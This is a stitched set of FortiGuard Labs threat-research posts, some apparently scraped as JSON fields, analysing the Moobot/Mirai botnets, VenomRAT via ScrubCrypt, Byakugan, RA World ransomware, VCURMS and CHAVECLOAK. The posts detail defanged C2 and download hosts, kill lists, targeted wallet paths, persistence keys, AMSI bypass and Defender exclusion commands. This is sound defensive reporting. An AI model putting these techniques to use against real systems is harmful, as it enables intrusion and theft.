encoded strings and the hardcoded string “w5q6he3dbrsgmclkiu4to18npavj702f,” we can confirm this malware as Moobot. As the assembly indicates, a DDoS attack can be initiated on remote IPs via a C2 command. Additionally, there is an attack using a variant of Mirai. The exploitation process begins by downloading “tenda.sh” from “hxxp://94[.]156[.]8[.]244.” This script file then downloads an ELF execution file from the same IP address, available in 13 different architectures. The original execution file is compressed using UPX. This Mirai variant displays the message, “faggot got malware'd,” and monitors processes to terminate those associated with packet analysis tools. It then sends packets to the C2 server “45[.]155[.]91[.]135:21425” and awaits additional instructions for attacking. Below is an illustration of a DDoS attack scenario: The command and control (C2) server sends a packet with a length of 0x15, directing the endpoint to initiate an attack. The command specified is 0x01 for a Valve Source Engine (VSE) flood, with a duration of 60 seconds (0x3C), targeting a randomly selected victim's IP address and the port number 30129. Miori, another Mirai variant, shares similar modules. The batch script is fetched from “hxxp://185[.]224[.]128[.]34.” The downloader employs both HTTP and TFTP protocols to retrieve the ELF files. Once executed, Miori displays “your device just got infected to a bootnoot” in the console and sends \\x00\\x00 to the C2 server “rooty[.]cc” on TCP port 33335. The XOR key used for decoding configuration is 0xDFEDDEEF, and a hardcoded password list is included for the brute force attack function. The attacking command packet resembles those seen in previous Mirai variants. Condi’s downloader script was retrieved using multiple protocols to enhance the infection rate. Condi is executed with the parameter “work,” which is included in the first packet sent to the C2 server “bn[.]networkbn[.]click.” The command remains consistent withthe version distributed last year, retaining the function to prevent reboots by deleting binaries responsible for shutting down or rebooting the system. It also scans active processes and cross-references with predefined strings to terminate processes with matching names. Based on its selling page, Condi has updated its attacking methods, as shown below. As usual, botnets relentlessly target IoT vulnerabilities, continuously attempting to exploit them. Despite the discovery and provided remediation for the vulnerability CVE-2023-1389 last year, numerous campaigns still exploit it, resulting in significant peaks in our IPS telemetry. Users should be vigilant against DDoS botnets and promptly apply patches to safeguard their network environments from infection, preventing them from becoming bots for malicious threat actors.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High Last year, FortiGuard Labs uncovered the 8220 Gang’s utilization ofScrubCryptto launch attacks targeting exploitable Oracle WebLogic Servers. ScrubCrypt has been described as an “antivirus evasion tool” that converts executables into undetectable batch files. It offers several options to manipulate malware, making it more challenging for antivirus products to detect. We recently discovered a threat actor distributing a phishing email containing malicious Scalable Vector Graphics (SVG) files. The email lures victims into clicking on an attachment, which downloads a ZIP file containing a Batch file obfuscated with the BatCloak tool. ScrubCrypt is then used to load the final payload, VenomRAT while maintaining a connection with a command and control (C2) server to install plugins on victims’ environments. The plugin files downloaded from the C2 server include VenomRAT version 6, Remcos, XWorm, NanoCore, and a stealer designed for specific crypto wallets. This article provides detailed insights into how the threat actor distributes VenomRAT and other plugins. The attacker initiates the attack by sending a phishing email stating that a shipment has been delivered. It also includes an attached invoice. The attachment is an SVG file named “INV0ICE_#TBSBVS0Y3BDSMMX.svg,” which contains embedded base64-encoded data. After victims open the SVG file, the ECMAScript creates a new blob and utilizes “window.URL.createObjectURL” to drop the decoded data as a ZIP file named “INV0ICE_#TBSBVS0Y3BDSMMX.zip.” The decompressed file is an obfuscated batch file that embeds its payload in the section “------BEGIN X509 CRL-----.” Based on the decoded comment in the first line, it is presumed that this batch file was created by the BatCloak tool, known for using heavily obfuscated batch files to deploy various malware families. BatCloak has been employed since 2022 to distribute malware while effectively evading detection by antivirus programs. The script initially copies a PowerShell execution file to “C:\\Users\\Public\\xkn.exe” and utilizes the copied file in later commands. It includes parameters in each command, “-WindowStyle hidden -inputformat none -outputformat none -NonInteractive,” to conceal its activity from the victim’s notice. It then decodes the malicious data and saves it as “pointer.png.” After hex-decoding, the result is saved as a “pointer” and moved to “C:\\Users\\Public\\Libraries\\pointer.cmd.” Upon executing “pointer.cmd,” it employs “cmd /c del” to delete all the files mentioned above. The “pointer.cmd” file serves as the ScrubCrypt batch file. It is deliberately cluttered with numerous junk strings to obscure readability. It incorporates two payloads encoded in Base64 format and employs AES-CBC decryption and GZIP compression to decompress them. It uses the PowerShell command “[System.Reflection.Assembly]::Load” to load the decrypted .NET assembly from a byte array, accessing its entry point method and invoking that method to initiate the execution of the assembly's code. The first payload serves two primary purposes: establishing persistence and loading the targeted malware. It determines whether the current user is part of the built-in Administrator role in a Windows operating system to configure its persistence settings. Additionally, it checks for the presence of any debugger. If found, it terminates the program to avoid detection. If the current user holds Administrator privileges, the program duplicates itself to “%AppData%/strt.cmd” and utilizes a PowerShell command to establish a scheduled task named “OneNote 83701.” This task triggers upon user login, executes “strt.cmd,” and operates with elevated privileges. Conversely, if the user lacks Administrator permissions, the program duplicates itself to the “StartUp” folder under the filename “strt.cmd.” Finally, it loads an assembly from an embedded resource named “P,” which contains a compressed assembly. It then invokes the entry point method of the loaded assembly to execute VenomRAT. The second payload from the ScrubCrypt batch file is for AMSI bypass and ETW bypass. VenomRAT is a remote access Trojan (RAT) first identified in 2020. It is a modified version of the well-known Quasar RAT and is distributed through malicious attachments in spam emails. Cybercriminals utilize it to gain unauthorized access and control over targeted systems. As with other RATs, VenomRAT enables attackers to manipulate compromised devices remotely, allowing them to execute various malicious activities without the victim's knowledge or consent. The fundamental configurations of VenomRAT are Base64-encoded, and AES-CBC encrypted. The decrypted data is shown in Figure 14. After completing environmental checks, VenomRAT initiates communication with its C2 server. The initial packet transmitted contains basic information about the victim, such as hardware specifications, username, operating system details, camera availability, execution path, foreground window name, and the name of the antivirus product installed. All C2 sessions are encrypted using the certificate specified in its configuration. By debugging the program, we extracted and decompressed the packets, revealing the keep-alive sessions established with the C2 server. While VenomRAT's primary program may appear straightforward, it maintains communication channels with the C2 server to acquire additional plugins for various activities. The assembly responsible for parsing packets from the server is outlined below. Upon receiving the “save_Plugin” directive from the server, it can decompress the data and save it to the registry. The “save_Plugin” data comprises a DLL file named “SendFile,” which can parse other “plug_in” files sent from the C2 server. If a plugin file with the same name is already in the victim’s environment, it deletes the existing file and creates a new one with the current data. After decompressing the “plug_in” packet data, it examines the “Filename” to determine which PowerShell command to employ. In Figure 21, once a “plugin” packet is received from the server, VenomRAT reads the registry to fetch the data for “SendFile.dll” and executes the payload contained within the plugin. In the following sections, we’ll elaborate on the plugins provided by the VenomRAT C2 server. The first plugin is embedded in ScrubCrypt and loads without landing any execution file in the victim’s environment, which perfectly hides its trace. The second payload from the ScrubCrypt Batch file is called “ScrubBypass.” This file is highly obfuscated to hide the code flow, functions, and strings. ScrubBypass’s main jobs are patching the AMSI scan buffer and EtwEventWrite to achieve AMSI and ETW bypass. The plugin VenomRAT is version 6.0.3. It has a Keylogger function and stores its C2 server information on the Pastebin website. It collects multiple data types, monitors the victim’s keyboard activities, and persistently sends stolen data to the C2 server. NanoCore is a notorious Remote Access Trojan (RAT) first discovered in 2013. It is known for its ability to remotely access and control a victim's computer, often without their knowledge. It continues to be relevant in the cybercrime world due to its source code being leaked and widely distributed in underground forums. This plugin is distributed to compromised devices by an obfuscated VBS file, shown in Figure 26. The script stores the data for the next stage on the website “hxxps://nanoshield[.]pro/files,” which also serves as a Crypter service provider. Initially, it retrieves a JPG file and decodes the target section using the reversed URL as a parameter. Although accessing the second URL, “hxxps://nanoshd[.]pro/files/new_image.jpg?14441723,” was unsuccessful, modifying the hostname to “nanoshield.pro” allowed us to access to a similar file, as seen in the first URL ”hxxps://nanoshield[.]pro/new_image2.jpg?166154725.” The JPG file employs steganographic methods to conceal code inside the picture, embedding malware data encoded in Base64 between the tags <<BASE64_START>> and <<BASE64_END>>. After decoding the JPG file, we obtained a .NET execution file. This file establishes persistence by configuring the registry key “HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” and checks for any virtual environments. It then downloads encoded data from the “nanoshield.pro/files” URL, reverses the data, replaces the specific string “DgTre,” and employs “RegAsm” to proxy the execution of NanoCore. XWorm is a RAT that spreads through removable drives like USB flash drives, infecting Windows systems. It can steal information or allow remote access. Figure 32 shows the plugin from VenomRAT’s C2 server with the filename “xwrm3.1.vbs” at the end of the packet. In addition to the VBS file, we retrieved another “plug_in” containing a batch script attempting to execute PowerShell commands. It downloads encoded data from “hxxps://kisanbethak[.]com/K/Universallsningen.lpk.” The next stage of the PowerShell code resides at the end of the decoded “Universallsningen.lpk” file. Despite containing numerous junk comments to obfuscate analysis, the PowerShell script uses the Process Hollowing technique to inject shellcode into a legitimate process. Following injection and environment verification, the shellcode executes the final malware, XWorm. In this attack scenario, GuLoader also deploys NanoCore and Remcos. Remcos is a Remote Access Trojan (RAT) first appearing in 2016. It is marketed as legitimate software for remote management but is often used maliciously. Remcos can give attackers complete control over an infected system, allowing them to capture keystrokes, screenshots, credentials, and other sensitive information. It is typically delivered via malicious documents or archive files and has been seen in phishing campaigns. This plugin was distributed from VenomRAT’s C2 using three methods: an obfuscated VBS script named “remcos.vbs”, ScrubCrypt, and Guloader PowerShell. The configuration for Remcos is RC4 encrypted in the“SETTINGS”resource, and the decrypted data is shown in Figure 42. This plugin is not only deployed via the obfuscated VBS script mentioned in the previous section but it is also embedded in a .NET execution file obfuscated using SmartAssembly. The .NET execution file decodes the next stage payload from the Resource file “ach” and writes the data into the memory. It then copies itself to the TEMP folder and sets this copied file to the scheduled task named “Nano.” This task repeats every 10 minutes after the first trigger. The next stage payload is more straightforward. It contains a hardcoded array for the malicious DLL file for stealing the victim’s sensitive data. The DLL file stores its configuration in Base64 encoded data, including the C2 hostname and the certificate to encrypt the communication. This DLL file keeps monitoring the user’s system and aims for specific crypto wallets, Foxmail, and telegram data by performing the following tasks repeatedly: 1.     Gathers details about the victim's environment, such as the PC name, username, antivirus software, disk information, and operating system version. 2.     Verifies the existence of the following paths: “\"%AppData%\\atomic\\Local Storage\\leveldb” “%AppData%\\Electrum\\wallets,” “%AppData%\\Ethereum\\keystore,” “%AppData%\\Exodus\\exodus.wallet,” “%AppData%\\com.liberty.jaxx\\IndexedDB,” “%AppData%\\Zcash,” “%AppData%\\Foxmail” and “%AppData%\\Telegram Desktop\\Telegram.exe”. 3.     Checks if the following registry exists: “Software\\Bitcoin\\Bitcoin-Qt,” “Software\\Dash\\Dash-Qt” and “Software\\Litecoin\\Litecoin-Qt. “ 4.     Once collected, the targeted data sends the data appended with the execution file path at the end to the C2 server, “markjohnhvncpure[.]duckdns.org.” This analysis reveals a sophisticated attack leveraging multiple layers of obfuscation and evasion techniques to distribute and execute VenomRAT via ScrubCrypt. The attackers employ a variety of methods, including phishing emails with malicious attachments, obfuscated script files, and Guloader PowerShell, to infiltrate and compromise victim systems. Furthermore, deploying plugins through different payloads highlights the versatility and adaptability of the attack campaign. The attackers’ ability to persist in the system, evade detection, and execute malicious payloads underscores the importance of robust cybersecurity measures and vigilant monitoring to mitigate such threats effectively.

    "title": "Byakugan – The Malware Behind a Phishing Attack",
    "link": "https://www.fortinet.com/blog/threat-research/byakugan-malware-behind-a-phishing-attack",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In January 2024, FortiGuard Labs collected a PDF file written in Portuguese that distributes a multi-functional malware known as Byakugan. While investigating this campaign,a reportabout it was published. Therefore, this report will only provide a brief analysis of the overlap between that attack and this and focus primarily on the details of the infostealer. The PDF image shows a blurred table and asks the victim to click the malicious link on the PDF file to see the content. Once the link is clicked, a downloader is downloaded. The downloader drops a copy of itself (require.exe) along with a clean installer to the temp folder. It then downloads a DLL (dynamic link library), which is executed via DLL-hijacking to run require.exe to download the main module (chrome.exe). It executes the downloader's copy (require.exe), not the downloader (Reader_Install_Setup.exe), because when the downloader is named \"require.exe\" and located in the temp folder, its behavior is different from when it is Reader_Install_Setup.exe. The downloader downloads Byakugan’s main module from thinkforce[.]com[.]br. This is the C2 server from which Byakugan receives files and commands. However, it may also work as the attacker's control panel. There is a login page on port 8080. We found descriptions of its features from the page's source code. Byakugan is a node.js-based malware packed into its executable by pkg. In addition to the main script, there are several libraries corresponding to features. Additionally, Byakugan can download extra files to perform its functions. These are stored in the default base path, % APPDATA%ChromeApplication, which is also used to store data created by Byakugan. Byakugan has the following features: In a previous variant (7435f11e41735736ea95e0c8a66e15014ee238c3a746c0f5b3d4faf4d05215af), Byakugan downloaded the software from its domain. But this is not seen in this newer variant. In addition, there are some features that help Byakugan live as long as possible: In addition, it sets the path it uses to the Windows Defender’s exclusion path and allows files in the Windows firewall. There is a growing trend to use both clean and malicious components in malware, and Byakugan is no exception. This approach increases the amount of noise generated during analysis, making accurate detections more difficult. However, the downloaded files provided critical details about how Byakugan works, which helped us analyze the malicious modules. FortiGuard Labs will continue to monitor this malware and provide updates on this variant as they become available. The malware described in this report is detected and blocked by FortiGuard Antivirus as: W64/BKGStealer.854C!trW64/BKGStealer.4C6A!trW64/BKGStealer.47AF!trPDF/TrojanDownloader.Agent.BKN!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service.

    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the RA World ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Steals and encrypts victims' files and demands ransom for file decryption and not releasing the stolen data.Severity level:High The RA World ransomware was first submitted to a publicly available file scanning service in early December 2023. The threat actor steals victims' data before deploying and running its ransomware malware for file encryption. The group operates both TOR and non-TOR sites where victims' stolen data has been leaked. The ransomware is also designed to delete Volume Shadow Copies and system backups to inhibit system recovery. Information on the infection vector used by the RA World ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. The RA World ransomware samples were submitted to a publicly available file scanning service from the Netherlands, France, the United Kingdom, the Czech Republic, Poland, Colombia, and Japan. The ransomware's data leak sites list 23 victims at the time of this writing. The listed victims are located in Germany, the UK, the US, Italy, Poland, India, Taiwan, Mexico, France, Thailand, and Korea. The first available RA World sample (SHA2: 4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801) performs the following actions: It stops the following services: vss svc$ memtas sophos veeam backup mepocs GxVss GxBlr GxFWD GxCVD GxCIMgr DefWatch ccEvtMgr ccSetMgr SavRoam RTVscan QBFCService QBIDPService Intuit.QuickBooks.FCS QBCFMonitorService YooBackup YooIT zhudongfangyu stc_raw_agent VSNAPVSS VeeamTransportSvc VeeamDeploymentService VeeamNFSSvc PDVFSService BackupExecVSSProvider BackupExecAgentAccelerator BackupExecAgentBrowser BackupExecDiveciMediaService BackupExecJobEngine BackupExecManagementService BackupExecRPCService AcrSch2Svc AcronisAgent CASAD2DWebSvc CAARCUpdateSvc It terminates the following processes: sql.exe oracle.exe ocssd.exe dbsnmp.exe synctime.exe agntsvc.exe isqlplussvc.exe xfssvccon.exe mydesktopservice.exe ocautoupds.exe encsvc.exe firefox.exe tbirdconfig.exe mydesktopqos.exe ocomm.exe dbeng50.exe sqbcoreservice.exe excel.exe infopath.exe msaccess.exe mspub.exe onenote.exe outlook.exe powerpnt.exe steam.exe thebat.exe thunderbird.exe visio.exe winword.exe wordpad.exe notepad.exe The ransomware uses the following commands to delete Volume Shadow Copies: The malware encrypts files on the victims’ machines and adds the following extension to the encrypted files: It then drops the ransom note “Data breach warning.txt,“ which includes the following information: The ransomware excludes the following filetypes from file encryption: .exe .dll .RAWLD .iso .msi .bin It excludes the following files and folders from file encryption: AppData Boot Windows SYSVOL Tor Browser Internet Explorer Google Opera Opera Software Mozilla Mozilla Firefox $Recycle.Bin ProgramData All Users autorun.inf boot.ini bootfont.bin bootsect.bak bootmgr bootmgr.efi bootmgfw.efi desktop.ini $windows.~ws system volume information intel msocache perflogs iconcache.db ntldr ntuser.dat ntuser.dat.log ntuser.ini thumbs.db Program Files Program Files (x86) #recycle config.msi $windows.~bt The ransomware uses the following specific mutex: Based on this RA World ransomware sample, the following assumption can be made: For example, another RA World ransomware sample (SHA2: 51da3acc6c7089bd0f1df9d9902e183db0d1342552404c3c1b898b168399b0bc) claims to have been compiled on Aug 24 17:56:57 2022 GMT, however this sample did not appear on the file scanning site until February 2, 2024. Its ransom note lists fewer unpaid victims, indicating that the sample was created after 4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801. A minor variant of the RA World ransomware (SHA2: 9479a5dc61284ccc3f063ebb38da9f63400d8b25d8bca8d04b1832f02fac24de) became available at the end of January 2024. This variant performs the identical actions as 4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801 except for the following: A few days later, yet another minor RA World ransomware variant (SHA2: 31ac190b45cc32c04c2415761c7f152153e16750516df0ce0761ca28300dd6a4) became available. This variant also performs the identical actions as the previously mentioned RA World ransomware samples except for the following: As mentioned above, the RA World ransomware group operates both TOR and non-TOR sites to publish stolen data. The site includes the following statement, which provides a clue to the group's location: War is death’s feast. I survived, but my friend didn’t. Below is an example of a page created for one of the victims: The RA World ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation.

    "title": "VCURMS: A Simple and Functional Weapon",
    "link": "https://www.fortinet.com/blog/threat-research/vcurms-a-simple-and-functional-weapon",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms with Java installedImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High Recently, FortiGuard Labs uncovered a phishing campaign that entices users to download a malicious Java downloader with the intention of spreading new VCURMS and STRRAT remote access trojans (RAT). The attackers stored malware on public services like Amazon Web Services (AWS) and GitHub, employing a commercial protector to avoid detection of the malware. The attacker attempts to use email as its command and control throughout the attack campaign. The receiving endpoint utilizes Proton Mail, which offers email services that include privacy protection. Figure 1 shows the attack chain. This blog describes how the malware is delivered and specifically examines the unusual VCURMS RAT that is involved in this campaign. The phishing email shown in Figure 2 is part of this attack campaign. It targets staff members, implying that a payment is underway and encourages them to click a button to verify payment information. Upon clicking the button, a harmful JAR file hosted on AWS is downloaded to the victim's computer. The downloaded files resemble typical phishing attachments with spoofed names intended to lure people into opening them. When you look at the file with a JAR decompiler, many strings are obfuscated and one of the class names “DownloadAndExecuteJarFiles.class” clearly indicates the intention of this program, as shown in Figure 3. The program aims to download two JAR files to the attacker-provided path and executes them. As shown in Figure 4, a class employed by the obfuscator is labeled \"sense loader\" in the debug data. The obfuscator selects the appropriate native loader module from the resources based on the current operating system during the execution process. After a specific date, running the malware causes a notification to appear regarding the expiration of the trial for protected tools as shown in Figure 5. Additionally, the code generated by the obfuscator closely resembles the code produced by a legitimate obfuscation tool known as \"Sense Shield Virbox Protector\" as shown in Figure 6. The rest of the execution flow of the JAR file downloads two additional JAR files and runs them separately. We observed an unusual RAT that communicates with its command and control through email. During the initialization step, the program replicates itself into the Startup folder to ensure that it runs automatically when Windows starts. It then alerts the attacker that the victim is online and establishes a schedule to periodically check the mailbox as shown in Figure 7. The attacker identifies the victim using the computer name and Volume ID. When the malware needs to verify the command provided by the attacker, it first examines whether the subject of the email contains identifying information and then proceeds to check the command within the body of the email. The keylogger and password recovery malware are also hosted on AWS and disguised with a .jpg extension. They are downloaded using a PowerShell command. In addition to installing keyloggers and password recovery malware, the command provides various customizable features such as the ability to execute shell commands and upload and download files as shown in Table 1. Command Details get information Retrieve system details such as the operating system version, memory capacity, computer name, volume ID, username, country, and the files in the Desktop and Documents folders. shell Obtain the command and execute it throughcmd.exe /c;the result is sent back to the attacker via email. recovery Download arecoveryJAR file with a .jpg extension and execute it. start keylogger Download akeyloggerJAR file with a .jpg extension and execute it. get keylogger Attach the keylogger data and send it as an attachment. upload Compress the file at the specified location and then send it as an attachment. download Retrieve the attachment and only allow file extensions that are in .jpg format to be accepted. search Look for file names containing keywords specified by the attacker. Table 1: Commands The most downloaded malware in this campaign are obfuscated using the Branchlock obfuscator. Information about this obfuscator is located at the end of the JAR file as shown in Figure 10. TheNarumii/Deobfuscatorplays a crucial role in partially supporting the deobfuscation of a program obfuscated with Branchlock. When the command \"recovery\" is received, the program is downloaded and deployed into the %USERPROFILE%\\AppData\\cookie directory with the name st.jar. The primary purpose of the program is to steal information, particularly system information, popular browsers, and apps. The program gathers account information from apps and collects cookies, autofill data, browsing history, and passwords from browsers. The data collected is stored in the directory located at %USERPROFILE%/<username>. Despite the component similarities to Rude Stealer, a Java-based infostealer, this program adopts the name VCURMS. We also have observed a distinction in the method of transmitting the pilfered data. The attacker follows the same path as the main program and sends the stolen information through the same email address. The downloaded keylogger will ultimately be stored in %USERPROFILE%\\AppData\\cookie\\klog.jar. This file is responsible for recording keystrokes. Additional actions such as sending logs back to the attacker requires the main JAR file \"windows.jar\" to execute the functions. STRRAT is a RAT built using Java, which has a wide range of capabilities, such as serving as a keylogger and extracting credentials from browsers and applications. By the end of 2023, it was discovered that STRRAT utilizes two string obfuscation techniques, namely \"Zelix KlassMaster (ZKM)\" and \"Allatori\" to avoid detection. However, the STRRAT observed in this attack campaign follows the same convoluted process. It uses the Allatori Java obfuscator and includes the Branchlock obfuscator, which makes analysis more difficult. The configuration file still remains in the resource. By decoding it using Base64 and decrypting it with the AES Algorithm using the passphrase \"strigoi,\" we can obtain information about the command and control server and ID “Khonsari.” This comprehensive attack operation deploys several malicious programs simultaneously on a victim’s system. It deploys a well-known STRRAT and a new VCURMS based on Java. Even though the VCURMS RAT primarily handles command and control communication, it also includes a modified version of a Rude Stealer and a keylogger in its second phase to gather sensitive data from the victim's system. We discovered that the threat actor was using multiple obfuscation techniques to avoid detection and attempting to use email for communicating with the command and control server.

    "title": "New Banking Trojan “CHAVECLOAK” Targets Brazil",
    "link": "https://www.fortinet.com/blog/threat-research/banking-trojan-chavecloak-targets-brazil",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Controls victim’s device and collects sensitive informationSeverity Level:High FortiGuard Labs recently uncovered a threat actor employing a malicious PDF file to propagate the banking Trojan CHAVECLOAK. This intricate attack involves the PDF downloading a ZIP file and subsequently utilizing DLL side-loading techniques to execute the final malware. Notably, CHAVECLOAK is specifically designed to target users in Brazil, aiming to steal sensitive information linked to financial activities. Figure 1 shows the detailed flow of this cyber threat. In the South American cyberthreat landscape, banking trojans employ a range of tactics, such as phishing emails, malicious attachments, and browser manipulation. Notable examples include Casbaneiro (Metamorfo/Ponteiro), Guildma, Mekotio, and Grandoreiro. These trojans specialize in illicitly obtaining online banking credentials and personal data, posing a significant threat to users in countries like Brazil and Mexico. The CHAVECLOAK's Command and Control (C2) server telemetry is shown in Figure 2. In this blog, we will elaborate on the details of the malware. The PDF, shown in Figure 3, claims contain documents related to a contract, with instructions written in Portuguese. It lures its victims to click a button so they can read and sign the attached documents. However, a malicious downloader link is discreetly embedded within the stream object, as shown in Figure 4, which reveals the decoded URL. This URL undergoes processing via the free link shortening service “Goo.su,” ultimately leading to a redirect at hxxps://webattach.mail.yandex.net/message_part_real/NotaFiscalEsdeletronicasufactrub66667kujhdfdjrWEWGFG09t5H6854JHGJUUR[.]zip for downloading the ZIP file. Upon decompression, the file yields the MSI file “NotafiscalGFGJKHKHGUURTURTF345.msi.” Following the decompression of the MSI installer, we uncovered multiple TXT files related to settings for different languages, a legitimate execution file, and a malicious DLL named “Lightshot.dll.” Notably, the modified date for this DLL file is more recent than that of all the other files in the installer, further emphasizing its unusual nature. Examining the MSI installer reveals its entire configuration, which is written in Portuguese. It executes the file “Lightshot.exe,” extracting and depositing files at “%AppData%\\Skillbrains\\lightshot\\5.5.0.7,” as shown in Figure 6. The file “Lightshot.exe” then deploys DLL sideloading techniques to activate the execution of the malicious DLL, \"Lightshot.dll.\" This technique lets the legitimate executable load and run the malicious code discreetly, facilitating unauthorized activities like data theft. The actions conducted by “Lightshot.dll” involve covert and harmful operations, including the unauthorized acquisition of sensitive information. DLL sideloading poses a significant security threat by allowing the malware to exploit legitimate processes for nefarious purposes without detection. Initially, the process invokes “GetVolumeInformationW” to gather details about the file system and the associated volume related to the specified root directory. It utilizes the HEX value obtained to generate a log file in “%AppData%[HEX ID]lIG.log.” Following this, it adds a registry value named “Lightshot” to “HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,” ensuring automatic execution of the “Lightshot.exe” program upon user login. Once logging and persistence are completed, it sends an HTTP request to hxxp://64[.]225[.]32[.]24/shn/inspecionando.php. If geo-checking confirms that the victim is in Brazil, it logs data on the server, accessible through the path “clients.php,” as shown in Figure 8. It then periodically monitors the foreground window using the APIs “GetForegroundWindow” and “GetWindowTextW.” Upon identifying a window and confirming its name against a predefined list of bank-related strings, the malware establishes communication with its Command and Control (C&C) server. The malware facilitates various actions to steal a victim's credentials, such as allowing the operator to block the victim's screen, log keystrokes, and display deceptive pop-up windows, as shown in Figure 10. The malware actively monitors the victim's access to specific financial portals, including several banks and Mercado Bitcoin, which encompasses both traditional banking and cryptocurrency platforms. After obtaining the user's entered login data, the malware initiates communication with its Command and Control (C2) server at hxxp://comunidadebet20102[.]hopto[.]org. Depending on the bank associated with the stolen data, it uploads the information to distinct paths: “04/M/” for Mercado Bitcoin. It then transmits a POST request containing essential system details and configures the account information within the “InfoDados” parameter, as seen in Figure 12. Additionally, we acquired an older variant of CHAVECLOAK from the check-in site. Its process differs from the previous one, as the ZIP file contains a Delphi executable file embedding the final payload in the RCData section. It begins by retrieving system information to establish a new folder and stores the payload at “C:\\Program Files (x86)\\Editor-GH-[HEX ID]\\Editor-[HEX ID].exe.” Simultaneously, it creates a log file, establishes persistence, and utilizes the PowerShell command “Add-MpPreference –ExclusionPath” to exclude the path “Editor-GH-[HEX ID]” from Windows Defender scans. Subsequently, it sends a check-in request to hxxp://64[.]225[.]32[.]24/desktop/inspecionando.php. Notably, this variant appears to be an earlier version, indicated by the victims' check-in date starting in 2023. It also actively observes user behavior, captures front window text, and harvests personally identifiable information from specified banking and Bitcoin login pages, including names, passwords, and keystrokes. It then transmits the stolen data to the Command and Control (C2) server at hxxp://mariashow[.]ddns[.]net/dtp/cnx.php. The emergence of the CHAVECLOAK banking Trojan underscores the evolving landscape of cyberthreats targeting the financial sector, specifically focusing on users in Brazil. Utilizing sophisticated techniques, including malicious PDFs, ZIP file downloads, DLL sideloading, and deceptive pop-ups, it joins a cohort of prominent banking trojans that primarily target South America. CHAVECLOAK employs Portuguese language settings, indicating a strategic approach to the region, and actively monitors victims' interactions with financial portals. CHAVECLOAK exemplifies the sophistication of contemporary banking trojans, necessitating continual vigilance and proactive cybersecurity measures to safeguard against evolving threats within the financial landscape of South America.

